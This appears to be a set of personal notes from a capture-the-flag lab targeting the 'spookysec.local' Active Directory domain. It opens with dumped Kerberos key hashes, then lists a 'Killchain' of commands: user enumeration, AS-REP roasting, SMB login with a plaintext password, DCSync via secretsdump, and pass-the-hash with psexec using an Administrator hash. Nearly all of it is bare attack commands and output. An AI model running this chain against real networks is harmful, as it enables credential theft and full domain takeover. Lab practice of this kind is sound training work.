spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:f8c5ebc77e5cbc08dee6b3b10e957a19615bfac2b98540527795e14e03476bd1
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:8677a42cef2b1adf445b14e855d05242
ATTACKTIVEDIREC$:des-cbc-md5:e057a10e67e525c8
[*] Cleaning up... 


impacket-psexec Administrator:@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

# Killchain
enum4linux 10.10.157.51
	echo "10.10.114.10    spookysec.local" >> /etc/hosts

/kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100

impacket-GetNPUsers spookysec.local/svc-admin -no-pass

smbclient -L spookysec.local\\10.10.114.10 -U 'svc-admin'
smbmap -H spookysec.local -d spookysec.local -u svc-admin -p management2005

impacket-secretsdump -just-dc backup@spookysec.local

impacket-psexec Administrator:@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc